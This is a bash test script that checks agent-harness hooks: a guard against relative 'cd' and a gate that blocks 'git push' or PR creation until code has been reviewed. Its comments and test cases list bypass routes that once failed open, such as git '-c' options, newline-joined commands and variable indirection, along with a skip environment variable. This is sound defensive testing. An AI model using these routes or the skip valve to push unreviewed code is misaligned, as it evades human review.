#!/usr/bin/env bash
# Gate-hook wiring canary — proves the PreToolUse gate hooks actually receive and
# act on tool input via the REAL channel (stdin JSON), not the stale CLAUDE_TOOL_INPUT
# env var that silently disabled them (discovered S45, 2026-07-04).
#
# WHY THIS EXISTS: an earlier generation of gate smoke-tests set CLAUDE_TOOL_INPUT
# manually, so they validated hook LOGIC through a channel the harness never uses —
# the wiring bug sailed through green (P64/P72). This test feeds input the way the
# harness does: JSON on stdin. If a hook's input line regresses, this screams.
#
# ⚠️ CORRECTED 2026-08-07 — this paragraph used to name `wrap-mutex-race-test.sh` as
# that offender, and the naming is now WRONG in two ways. Measured, not argued:
#   1. `git-sync-lock.js` is not a stdin hook at all. It is a CLI — the race test
#      drives it as `node git-sync-lock.js acquire|status|release`, which is exactly
#      how `/wrap` Step 8 invokes it. The stdin-vs-env rule is inapplicable to it.
#   2. The race test's ONE `CLAUDE_TOOL_INPUT` line is a deliberate assertion that the
#      documented legacy fallback still works, and it runs with `</dev/null` so stdin
#      is empty ON PURPOSE. That is the opposite of masking a dead stdin path.
# Left uncorrected, this line made `skills/hook-review/SKILL.md` read as
# self-contradictory (its Step 2 bans env smokes and then endorses that test), which
# is how a stale repudiation discredits a control that was fine. Baseline the same day:
# race test 22/0 unit-smoke, mutex serialized 30/30 against a harness whose RED phase
# proves the concurrency is real. Its coverage claim stands — do not demote it.
#
# Run: bash ~/.claude/hooks/tests/gate-hooks-canary.sh
set -u
HOOKS="$HOME/.claude/hooks"
REVIEW_GATE="$HOME/.claude/skills/review/scripts/check-review-gate.js"
PASS=0; FAIL=0
pass(){ PASS=$((PASS+1)); printf '  ✅ %s\n' "$1"; }
fail(){ FAIL=$((FAIL+1)); printf '  ❌ %s (got exit %s, wanted %s)\n' "$1" "$2" "$3"; }

# run <expected_exit> <label> <hook_path> <json>  [env assignments...]
run(){ local want="$1" label="$2" hook="$3" json="$4"; shift 4
  local got; env "$@" bash -c "printf '%s' '$json' | node '$hook'" >/dev/null 2>&1; got=$?
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got" "$want"; }

echo "== 0. Syntax check =="
for h in check-cd-persistence.js check-anticheat.js check-eval-first.js; do
  if node --check "$HOOKS/$h" 2>/dev/null; then pass "syntax $h"; else fail "syntax $h" 1 0; fi
done
node --check "$REVIEW_GATE" 2>/dev/null && pass "syntax check-review-gate.js" || fail "syntax check-review-gate.js" 1 0

echo "== 1. cd-persistence (stdin wiring + block) =="
run 2 "relative cd → BLOCK"            "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","tool_input":{"command":"cd scripts && ls"}}'
run 0 "git -C absolute → allow"        "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","tool_input":{"command":"git -C /x status"}}'
run 0 "cd /absolute → allow"           "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","tool_input":{"command":"cd /abs/path"}}'
run 0 "empty stdin → fail-open"        "$HOOKS/check-cd-persistence.js" ''
# Subagent exemption (P3, payload shape captured 2026-09-15: parent transcript_path + agent_id).
run 0 "subagent relative cd (agent_id) → allow" "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","transcript_path":"/x/p/abc.jsonl","agent_id":"a7196d46309b5bf01","agent_type":"general-purpose","tool_input":{"command":"cd scripts && ls"}}'
run 2 "main relative cd, same transcript_path, no agent_id → BLOCK" "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","transcript_path":"/x/p/abc.jsonl","tool_input":{"command":"cd scripts && ls"}}'
run 2 "blank agent_id fails closed → BLOCK" "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","agent_id":"","tool_input":{"command":"cd scripts && ls"}}'
run 2 "non-string agent_id fails closed → BLOCK" "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","agent_id":true,"tool_input":{"command":"cd scripts && ls"}}'
run 2 "agent_type without agent_id (--agent main session) → BLOCK" "$HOOKS/check-cd-persistence.js" '{"tool_name":"Bash","agent_type":"Explore","tool_input":{"command":"cd scripts && ls"}}'
# Absolute-valued variables (2026-10-04). Each ALLOW is a real main-session fire shape that
# the certain-resolution path could not see (transcript replay: 12 of 17 still-blocking
# `cd $VAR` commands). Each BLOCK pins a relative shape the new rule must not swallow.
CDH="$HOOKS/check-cd-persistence.js"
cdj(){ printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1"; }
run 0 "cd \$TMPDIR → allow"                         "$CDH" "$(cdj 'cd $TMPDIR; curl -s x')"
run 0 "cd \"\$TMPDIR\" || cd /abs → allow"           "$CDH" "$(cdj 'cd \"$TMPDIR\" 2>/dev/null || cd /private/tmp/s')"
run 0 "T=\$(mktemp -d); cd \$T → allow"              "$CDH" "$(cdj 'T=$(mktemp -d); cd $T && git init -q')"
run 0 "set -e; T=\$(mktemp -d); cd \"\$T\" → allow"  "$CDH" "$(cdj 'set -e; T=$(mktemp -d); cd \"$T\" && git init -q .')"
run 0 "S=/abs assigned after && → allow"            "$CDH" "$(cdj 'export X=1 && S=/private/tmp/s/tree && rm -rf \"$S\" && mkdir -p \"$S\" && cd $S && ls')"
run 0 "for-loop body R=/abs/\$w; cd \$R → allow"     "$CDH" "$(cdj 'for w in a b; do R=~/work/$w; cd $R; ls; done')"
run 0 "for r in ~/a ~/b; cd \$r → allow"             "$CDH" "$(cdj 'for r in ~/work/a ~/work/b; do echo $r; cd $r; ls; done')"
run 0 "root=\$(git rev-parse --show-toplevel) → allow" "$CDH" "$(cdj 'root=$(git rev-parse --show-toplevel); cd \"$root\" && ls')"
run 0 "cd \$(git rev-parse --show-toplevel) → allow"  "$CDH" "$(cdj 'cd $(git rev-parse --show-toplevel) && ls')"
run 2 "REL=scripts; cd \$REL → BLOCK"                 "$CDH" "$(cdj 'REL=scripts; cd $REL && ls')"
run 2 "cd ../x → BLOCK"                               "$CDH" "$(cdj 'cd ../x && ls')"
run 2 "D=data/x; cd \$D (real TP 09-23) → BLOCK"      "$CDH" "$(cdj 'S=/abs/print.py; D=data/proj/meeting; cd $D && ls')"
run 2 "mktemp with relative template → BLOCK"         "$CDH" "$(cdj 'T=$(mktemp -d tmp.XXXX); cd $T && ls')"
run 2 "cd \$PWD/sub (relative in disguise) → BLOCK"   "$CDH" "$(cdj 'cd $PWD/sub && ls')"
run 2 "for r in a ~/b, one relative word → BLOCK"     "$CDH" "$(cdj 'for r in sub ~/work/b; do echo $r; cd $r; done')"
run 2 "one abs, one relative assignment → BLOCK"      "$CDH" "$(cdj 'W=/abs; [ -d x ] && W=rel; cd $W')"
run 2 "abs assignment only in a comment → BLOCK"      "$CDH" "$(cdj '# W=/abs\ncd $W && ls')"
run 2 "d=\$1 (unknown) → BLOCK"                       "$CDH" "$(cdj 'd=$1; cd $d && ls')"
# Review of 7aa0703 (2026-10-04): false ALLOWS — each cd below lands relative.
run 2 "mktemp -p. -t x (relative -p beats -t) → BLOCK" "$CDH" "$(cdj 'T=$(mktemp -d -p. -t x); cd $T && ls')"
run 2 "mktemp --tmpdir=. → BLOCK"                     "$CDH" "$(cdj 'T=$(mktemp -d --tmpdir=.); cd $T && ls')"
run 2 "TMPDIR=build; cd \$TMPDIR → BLOCK"             "$CDH" "$(cdj 'TMPDIR=build; cd $TMPDIR && ls')"
run 2 "export OLDPWD=sub; cd \$OLDPWD → BLOCK"        "$CDH" "$(cdj 'export OLDPWD=sub; cd $OLDPWD && ls')"
run 2 "HOME=build; cd \$HOME → BLOCK"                 "$CDH" "$(cdj 'HOME=build; cd $HOME && ls')"
run 2 "HOME=build; cd ~ → BLOCK"                      "$CDH" "$(cdj 'HOME=build; cd ~ && ls')"
run 2 "D=\"~/x\" (quoted tilde is literal) → BLOCK"    "$CDH" "$(cdj 'D=\"~/x\"; cd $D && ls')"
run 2 "cd '\$TMPDIR' (single-quoted literal) → BLOCK" "$CDH" "$(cdj 'cd \u0027$TMPDIR\u0027 && ls')"
run 2 "cd ~+/sub (~+ is \$PWD) → BLOCK"               "$CDH" "$(cdj 'cd ~+/sub && ls')"
# Positive controls for the same code paths — these must stay allowed.
run 0 "mktemp -d -p /tmp -t x → allow"                "$CDH" "$(cdj 'T=$(mktemp -d -p /tmp -t x); cd $T && ls')"
run 0 "mktemp -d --tmpdir=\"\$TMPDIR\" → allow"         "$CDH" "$(cdj 'T=$(mktemp -d --tmpdir=\"$TMPDIR\"); cd $T && ls')"
run 0 "D=~/x (unquoted tilde); cd \$D → allow"        "$CDH" "$(cdj 'D=~/x; cd $D && ls')"
run 0 "cd ~ / cd \"\$HOME/x\" / cd \${OLDPWD} → allow"  "$CDH" "$(cdj 'cd ~ && cd \"$HOME/x\" && cd ${OLDPWD}')"
run 0 "TMPDIR=/abs; cd \$TMPDIR → allow"              "$CDH" "$(cdj 'TMPDIR=/private/tmp/x; cd $TMPDIR && ls')"

# Oversized commands (>20k chars) take a cheaper path; ${HOME:+sub} / ${HOME#/} expand RELATIVE
# (review of 2e134ba: `\$\{?HOME\b` accepted them).
BIG=$(node -e 'console.log("a".repeat(21000))')
run 2 "oversized: cd \${HOME:+sub} → BLOCK" "$HOOKS/check-cd-persistence.js" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo $BIG; cd \${HOME:+sub}\"}}"
run 0 "oversized: cd \${HOME}/x → allow" "$HOOKS/check-cd-persistence.js" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo $BIG; cd \${HOME}/x\"}}"

echo "== 2. review-gate (PUSH-time, S81: branch-vs-base delta, per-repo flag, unreviewed-CODE-only blocking) =="
# S81 moved the gate from `git commit` to `git push` / `gh pr create` (owner rule:
# review per slice, self-check per commit). The surface is what a push SENDS: every
# committed change on this branch since it left the default branch (merge-base with
# origin/HEAD). /review and the flag writer read base→working-tree, a superset, so a
# review of uncommitted work still covers it once committed. Test repos therefore get
# a bare origin, a pushed base, and COMMITTED changes — a working-tree-only edit is
# not something a push sends.
REVIEW_SCRIPTS="$HOME/.claude/skills/review/scripts"
WRITE_FLAG="$REVIEW_SCRIPTS/write-review-flag.js"
node --check "$WRITE_FLAG" 2>/dev/null && pass "syntax write-review-flag.js" || fail "syntax write-review-flag.js" 1 0
node --check "$REVIEW_SCRIPTS/diff-chunks.js" 2>/dev/null && pass "syntax diff-chunks.js" || fail "syntax diff-chunks.js" 1 0
# mkrepo <dir>: repo on master with a bare origin. pushbase: publish base + set origin/HEAD.
mkrepo(){ git init -q --bare "$1.origin.git"; git -C "$1" init -q -b master
  git -C "$1" config user.email t@t; git -C "$1" config user.name t; git -C "$1" remote add origin "$1.origin.git"; }
pushbase(){ git -C "$1" push -q origin master 2>/dev/null; git -C "$1" remote set-head origin master; }
cm(){ git -C "$1" add -A; git -C "$1" commit -qm "${2:-wip}"; }
flagof(){ node -e 'const m=require(process.env.HOME+"/.claude/skills/review/scripts/diff-chunks.js");console.log(m.flagPath(require("fs").realpathSync(process.argv[1])))' "$1"; }
R2=$(mktemp -d); mkrepo "$R2"
printf 'var a=1\n' > "$R2/f.js"
printf '{"evt":"base"}\n' > "$R2/skill-log.jsonl"      # telemetry log tracked from base
cm "$R2" base; pushbase "$R2"
printf 'var b=2\n' >> "$R2/f.js"; cm "$R2"             # an unpushed CODE commit
J="{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push\"}}"
FLAG2=$(flagof "$R2"); rm -f "$FLAG2"
run 2 "unpushed code commit, no flag → push BLOCK"     "$REVIEW_GATE" "$J"
# ~/.claude is exempt (owner, 2026-10-10: "The sync should happen without any review
# gate" — wrap Step 8 sync). HOME is pointed at a temp dir so the exempt repo is a
# fixture, never the real ~/.claude. Positive control: a SIBLING repo under the same
# HOME, same unpushed code commit, still BLOCKS — the exemption is one path, not HOME.
HX=$(mktemp -d); mkdir -p "$HX/.claude" "$HX/other"; mkrepo "$HX/.claude"; printf 'var a=1\n' > "$HX/.claude/f.js"; cm "$HX/.claude" base; pushbase "$HX/.claude"
printf 'var b=2\n' >> "$HX/.claude/f.js"; cm "$HX/.claude"
mkrepo "$HX/other"; printf 'var a=1\n' > "$HX/other/f.js"; cm "$HX/other" base; pushbase "$HX/other"
printf 'var b=2\n' >> "$HX/other/f.js"; cm "$HX/other"
run 0 "~/.claude unpushed code, no flag → push ALLOW (owner exemption)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $HX/.claude push\"}}" HOME="$HX"
run 0 "~/.claude via tilde → push ALLOW (owner exemption)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C ~/.claude push\"}}" HOME="$HX"
run 2 "sibling repo under same HOME, no flag → push still BLOCK (control)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $HX/other push\"}}" HOME="$HX"
rm -rf "$HX"
# Positive control for the redirect fix below: stripping `2>&1` must not open the gate.
run 2 "no flag, push origin master 2>&1 → still BLOCK"  "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push origin master 2>&1\"}}"
run 2 "no flag, push origin master >/dev/null 2>&1 → still BLOCK" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push origin master >/dev/null 2>&1\"}}"
# The S81 move itself, both directions: commits are free, sending is gated.
printf 'var q=0\n' >> "$R2/f.js"                     # UNCOMMITTED code: the old commit gate blocked exactly this
run 0 "git commit with unreviewed code → allow (gate moved off commit)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 commit -m x\"}}"
git -C "$R2" checkout -q -- f.js
run 2 "cd <repo> && gh pr create → BLOCK"              "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R2 && gh pr create --fill\"}}"
run 2 "gh -R o/r pr create → BLOCK (global option before pr)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R2 && gh -R o/r pr create --fill\"}}"
run 0 "cd <repo> && gh pr list → allow"                "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R2 && gh pr list\"}}"
run 0 "git push --delete (sends no code) → allow"      "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push origin --delete feat\"}}"
run 0 "git push origin :feat (delete refspec) → allow" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push origin :feat\"}}"
run 0 "git push --dry-run → allow"                     "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push --dry-run\"}}"
run 2 "commit && push in one cell → BLOCK"             "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 commit -qm x && git -C $R2 push -u origin master\"}}"
# Global git options must not bypass the matcher (S256 review: the single-option
# regex failed open on `-c`/`--no-pager`; confirmed exploitable). Both directions:
run 2 "git -c k=v push → still BLOCK (option-tokenizer)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -c push.default=current -C $R2 push\"}}"
run 2 "git --no-pager push → still BLOCK"              "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git --no-pager -C $R2 push\"}}"
run 0 "git -c k=v log → non-push still allowed"        "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -c core.pager=cat -C $R2 log\"}}"
# NEWLINE-separated commands (S184): the shared matcher once swallowed newlines, so a
# multi-line cell — the form /wrap emits — sailed past. Both directions asserted.
run 2 "newline-separated add⏎commit⏎push → BLOCK"      "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 add -A\\ngit -C $R2 commit -m x\\ngit -C $R2 push\"}}"
run 0 "newline cell with NO push → allow"              "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 add -A\\ngit -C $R2 diff --cached\"}}"
run 0 "no flag + skip valve → allow"                   "$REVIEW_GATE" "$J" CLAUDE_REVIEW_GATE_SKIP=1
run 0 "inline skip prefix on gh pr create → allow"     "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R2 && CLAUDE_REVIEW_GATE_SKIP=1 gh pr create --fill\"}}"
: > "$FLAG2"
run 2 "empty/corrupt flag → BLOCK (fail-closed)"       "$REVIEW_GATE" "$J"
printf '{"repo":"%s","diffHash":"x","verdict":"PASS","ts":"t"}' "$R2" > "$FLAG2"
run 2 "legacy S47 diffHash-only flag → BLOCK (no per-file coverage = whole diff unreviewed)" "$REVIEW_GATE" "$J"
node "$WRITE_FLAG" --verdict PASS --repo "$R2" >/dev/null 2>&1
run 0 "writer roundtrip: PASS flag + unchanged branch → allow" "$REVIEW_GATE" "$J"
# Shell redirections are not refspecs (S84): the segment scan cuts at `&`, so `2>&1`
# left a `2>` token that parsePush read as a source → "cannot resolve `2>`" false block.
for RD in '2>&1' '>/dev/null 2>&1' '2>/dev/null' '> out.log' '2>> err.log'; do
  run 0 "reviewed, push origin master $RD → allow (redirect is not a refspec)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R2 push origin master $RD\"}}"
done
# DELTA PASS direction — must flow WITHOUT re-review:
printf '# notes\n' > "$R2/notes.md"; cm "$R2"
run 0 "reviewed code + docs-only commit → allow (no re-review loop)" "$REVIEW_GATE" "$J"
printf '{"evt":"wrap","step":6}\n' >> "$R2/skill-log.jsonl"; cm "$R2"
run 0 "reviewed code + telemetry .jsonl commit → allow (the every-wrap block, killed)" "$REVIEW_GATE" "$J"
# Only what is SENT counts: unreviewed code still sitting uncommitted does not block.
printf 'var u=0\n' >> "$R2/f.js"
run 0 "uncommitted unreviewed code, committed work reviewed → allow (not sent)" "$REVIEW_GATE" "$J"
git -C "$R2" checkout -q -- f.js
# DELTA BLOCK direction — genuinely new/changed committed code must still block:
printf 'var c=3\n' > "$R2/g.js"; cm "$R2"
run 2 "reviewed code + NEW code file committed → BLOCK" "$REVIEW_GATE" "$J"
git -C "$R2" reset -q --hard HEAD~1
printf 'var d=4\n' >> "$R2/f.js"; cm "$R2"
run 2 "reviewed file EDITED + committed after review → BLOCK (chunk hash changed)" "$REVIEW_GATE" "$J"
printf 'var a=1\nvar b=2\n' > "$R2/f.js"; cm "$R2"      # byte-exact revert to reviewed state
run 0 "edit reverted to reviewed bytes → allow (branch diff matches again)" "$REVIEW_GATE" "$J"
# THE everyday flow: /review sees UNCOMMITTED work, then it is committed, then pushed.
printf 'var k=7\n' >> "$R2/f.js"
node "$WRITE_FLAG" --verdict PASS --repo "$R2" >/dev/null 2>&1
cm "$R2"
run 0 "review uncommitted → commit → push → allow (writer covers base→worktree)" "$REVIEW_GATE" "$J"
# --delta CLI mode (consumed by /review Step 3): must agree with the hook (P72 one source).
D=$(node "$REVIEW_GATE" --delta --repo "$R2")
case "$D" in *f.js*) fail "--delta after PASS: reviewed f.js excluded" "included" "excluded";; *) pass "--delta after PASS: reviewed f.js excluded";; esac
printf 'var e=5\n' > "$R2/h.js"; git -C "$R2" add h.js
D=$(node "$REVIEW_GATE" --delta --repo "$R2")
case "$D" in *h.js*) pass "--delta: new h.js included, delta-scoped";; *) fail "--delta: new h.js included" "missing" "included";; esac
case "$D" in *f.js*) fail "--delta: f.js still excluded alongside new code" "included" "excluded";; *) pass "--delta: f.js still excluded alongside new code";; esac
git -C "$R2" rm -q --cached h.js; rm -f "$R2/h.js"
# --delta covers COMMITTED unpushed work too (the slice), not only the working tree:
rm -f "$FLAG2"
D=$(node "$REVIEW_GATE" --delta --repo "$R2")
case "$D" in *f.js*) pass "--delta with no flag: committed unpushed f.js included";; *) fail "--delta with no flag: committed unpushed f.js included" "missing" "included";; esac
node "$WRITE_FLAG" --verdict PASS --repo "$R2" >/dev/null 2>&1
# REVISE blocks outright, even with an empty delta (must-fix items outstanding):
node "$WRITE_FLAG" --verdict REVISE --repo "$R2" >/dev/null 2>&1
run 2 "verdict REVISE → BLOCK (even with empty delta)"  "$REVIEW_GATE" "$J"
node "$WRITE_FLAG" --verdict PASS --repo "$R2" >/dev/null 2>&1
# Per-repo isolation: another repo's /review must NOT clobber this repo's flag (S255).
R3=$(mktemp -d); git -C "$R3" init -q; git -C "$R3" config user.email t@t; git -C "$R3" config user.name t
printf 'x=1\n' > "$R3/a.py"; cm "$R3" base; printf 'y=2\n' >> "$R3/a.py"
node "$WRITE_FLAG" --verdict PASS --repo "$R3" >/dev/null 2>&1
run 0 "flag survives another repo's review → allow (per-repo, no clobber)" "$REVIEW_GATE" "$J"
# No remote at all: no base to compare against → the whole history is the surface
# (fails toward review). R3's flag covered only the uncommitted y=2 line... and its
# base commit is code, so a push from R3 must BLOCK.
FLAG3=$(flagof "$R3"); rm -f "$FLAG3"
run 2 "repo with no origin + code history → BLOCK (empty-tree base, fail toward review)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R3 push\"}}"
rm -rf "$R3"
# FEATURE BRANCH: the surface is the whole branch vs the default branch, even after part
# of it already reached the remote branch (the PR shows all of it).
R7=$(mktemp -d); mkrepo "$R7"; printf 'hi\n' > "$R7/README.md"; cm "$R7" base; pushbase "$R7"
git -C "$R7" checkout -q -b feat; printf 'def x; end\n' > "$R7/x.rb"; cm "$R7"
git -C "$R7" push -q -u origin feat 2>/dev/null       # pushed outside the gate
printf 'more\n' >> "$R7/README.md"; cm "$R7"
J7="{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R7 push\"}}"
run 2 "feature branch: code already on origin/feat but unreviewed → BLOCK (base = default branch)" "$REVIEW_GATE" "$J7"
node "$WRITE_FLAG" --verdict PASS --repo "$R7" >/dev/null 2>&1
run 0 "feature branch after /review → allow" "$REVIEW_GATE" "$J7"
FLAG7=$(flagof "$R7"); rm -rf "$R7" "$R7.origin.git"; rm -f "$FLAG7"
# Content-only pushes need no flag at all:
R4=$(mktemp -d); mkrepo "$R4"; printf 'hello\n' > "$R4/README.md"; cm "$R4" base; pushbase "$R4"
printf 'more\n' >> "$R4/README.md"; cm "$R4"
run 0 "docs-only branch, NO flag → allow (content-only delta)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R4 push\"}}"
rm -rf "$R4" "$R4.origin.git"
run 0 "non-push → allow"                               "$REVIEW_GATE" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}'
# tilde expansion: `git -C ~/x push` must SCOPE (execFileSync doesn't expand ~).
FH="$(dirname "$R2")"
rm -f "$FLAG2"
run 2 "git -C ~/<repo> (tilde) + unreviewed code → BLOCK (tilde expanded, not fail-open)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C ~/$(basename "$R2") push\"}}" HOME="$FH"

# `cd <dir> && git push` — the WORKTREE form (2026-08-01). A hook sees only the command
# TEXT and cannot observe the cd. DISCRIMINATING PAIR: same ambient cwd, opposite exits,
# differing only in the cd target — if `cd` were ignored both would return the same code.
R5=$(mktemp -d); mkrepo "$R5"
printf 'hello\n' > "$R5/README.md"; cm "$R5" base; pushbase "$R5"
printf 'more docs\n' >> "$R5/README.md"; cm "$R5"   # content-only delta ⇒ no flag needed ⇒ allow
run 2 "cd <repo-with-unreviewed-code> && git push → BLOCK (cd resolved, not cwd)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R2 && git push\"}}"
run 0 "cd <docs-only-repo> && git push → allow (same cwd, opposite verdict)"      "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R5 && git push\"}}"
# A `cd` inside a commit MESSAGE must not redirect resolution.
run 0 "cd <docs-repo> && git commit -m '…cd <code-repo>…' && git push → allow (message cannot redirect)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R5 && git commit -m 'then cd $R2 and push' && git push\"}}"
# Precedence: explicit `git -C` outranks any cd prefix; a bogus cd falls back, never disables.
run 2 "cd /nonexistent && git -C <code-repo> push → BLOCK (-C wins; bogus cd falls back)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd /nonexistent-xyzzy && git -C $R2 push\"}}"

# `W=/abs; git -C "$W" push` and `R=/abs; cd "$R"` (2026-09-15 fire audit, FP class B).
# Each pair runs with cwd = the repo the OLD code would have fallen back to.
runin(){ local d="$1"; shift; pushd "$d" >/dev/null; run "$@"; popd >/dev/null; }
bc(){ printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1"; }
runin "$R5" 2 "cwd=docs, W=<code>; git -C \"\$W\" push → BLOCK (var resolved)"     "$REVIEW_GATE" "$(bc "W=$R2; git -C \\\"\$W\\\" push")"
runin "$R2" 0 "cwd=code, W=<docs>; git -C \"\$W\" push → allow (same form, opposite)" "$REVIEW_GATE" "$(bc "W=$R5; git -C \\\"\$W\\\" push")"
runin "$R5" 2 "W=<docs>; W=<code>; git -C \$W → BLOCK (last assignment wins)"        "$REVIEW_GATE" "$(bc "W=$R5; W=$R2; git -C \$W push")"
runin "$R2" 0 "W=<code>; W=<docs>; git -C \$W → allow (last assignment wins)"        "$REVIEW_GATE" "$(bc "W=$R2; W=$R5; git -C \$W push")"
runin "$R5" 2 "S=<parent>; R=\$S/<code>; git -C \"\$R\" → BLOCK (nested resolve)"       "$REVIEW_GATE" "$(bc "S=$FH; R=\\\"\$S/$(basename "$R2")\\\"; git -C \\\"\$R\\\" push")"
runin "$R5" 2 "cwd=docs, R=<code>; cd \"\$R\" && git push → BLOCK (cd var resolved)"   "$REVIEW_GATE" "$(bc "R=$R2; cd \\\"\$R\\\" && git push")"
runin "$R2" 0 "cwd=code, R=<docs>; cd \"\$R\" && git push → allow (opposite)"          "$REVIEW_GATE" "$(bc "R=$R5; cd \\\"\$R\\\" && git push")"
# Unresolvable forms keep the cwd fallback (never a guess, never exit-0-disabled):
runin "$R2" 2 "W=\$(cmd); git -C \$W → cwd fallback BLOCK (command substitution not guessed)" "$REVIEW_GATE" "$(bc "W=\$(echo $R5); git -C \$W push")"
runin "$R2" 2 "git -C \$W push; W=<docs> → cwd fallback BLOCK (assignment AFTER use ignored)" "$REVIEW_GATE" "$(bc "git -C \$W push; W=$R5")"
runin "$R2" 2 "W=/nonexistent; git -C \$W → cwd fallback BLOCK (non-dir never disables gate)" "$REVIEW_GATE" "$(bc "W=/nonexistent-xyzzy; git -C \$W push")"
runin "$R5" 2 "W=\"\$S\"/<code> (quoted piece + suffix) → BLOCK (value not truncated to parent)" "$REVIEW_GATE" "$(bc "S=$FH; W=\\\"\$S\\\"/$(basename "$R2"); git -C \\\"\$W\\\" push")"
runin "$R2" 2 "W=<parent-not-a-repo>; git -C \$W → cwd fallback BLOCK (resolved non-repo never exits 0)" "$REVIEW_GATE" "$(bc "W=$FH; git -C \$W push")"
runin "$R2" 2 "W=<docs> git -C \"\$W\" (env-PREFIX form, bash expands \$W first) → BLOCK" "$REVIEW_GATE" "$(bc "W=$R5 git -C \\\"\$W\\\" push")"
runin "$R2" 2 "(:; W=<docs>; true); git -C \$W (subshell assignment) → BLOCK"            "$REVIEW_GATE" "$(bc "(:; W=$R5; true); git -C \$W push")"
runin "$R2" 2 "f(){ :; W=<docs>; }; git -C \$W (function body never run) → BLOCK"         "$REVIEW_GATE" "$(bc "f(){ :; W=$R5; }; git -C \$W push")"
runin "$R2" 2 "echo \"x; W=<docs>; y\"; git -C \$W (assignment inside quotes) → BLOCK"    "$REVIEW_GATE" "$(bc "echo \\\"x; W=$R5; y\\\"; git -C \$W push")"
runin "$R2" 2 "x=1 # ; W=<docs> ⏎ git -C \$W (commented-out assignment) → BLOCK"          "$REVIEW_GATE" "$(bc "x=1 # ; W=$R5\\ngit -C \$W push")"
runin "$R2" 2 "W=<docs>; W+=/x; git -C \$W (append makes it unknown) → BLOCK"               "$REVIEW_GATE" "$(bc "W=$R5; W+=/x; git -C \$W push")"
runin "$R5" 2 "G=/tmp/git-tools; R=<code>; cd \"\$R\" && git push (git inside a path is not the command) → BLOCK" "$REVIEW_GATE" "$(bc "G=/tmp/git-tools; R=$R2; cd \\\"\$R\\\" && git push")"
runin "$R5" 2 "W=<code>; git \\\\⏎ -C \"\$W\" push (continuation-joined) → BLOCK"           "$REVIEW_GATE" "$(bc "W=$R2; git \\\\\\n -C \\\"\$W\\\" push")"
# Classifier TIMEOUT (security review 2026-09-15): a COPY of the gate beside a classifier
# that never returns must BLOCK (cls null → fail toward review) within a few seconds.
GT=$(mktemp -d); mkdir -p "$GT/skills/review/scripts" "$GT/hooks/lib"
cp "$REVIEW_GATE" "$(dirname "$REVIEW_GATE")/diff-chunks.js" "$GT/skills/review/scripts/"
cp "$HOOKS/lib/hook-input.js" "$GT/hooks/lib/"
printf 'setInterval(() => {}, 1000);\n' > "$GT/skills/review/scripts/classify-diff.js"
T0G=$(date +%s)
run 2 "classifier hangs → gate BLOCKS on its timeout (never hangs the push)" "$GT/skills/review/scripts/check-review-gate.js" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R5 push\"}}"
[ $(( $(date +%s) - T0G )) -le 6 ] && pass "hung classifier: gate returns in ≤6 s" || fail "hung classifier: gate returns in ≤6 s" "$(( $(date +%s) - T0G ))s" "≤6s"
rm -rf "$GT"
# ---- S81 review round: holes the 5-reviewer slate reproduced against the first cut ----
# (R2 here: no flag, unreviewed committed code; R5: docs-only. Every BLOCK case below
# exited 0 on the first cut.)
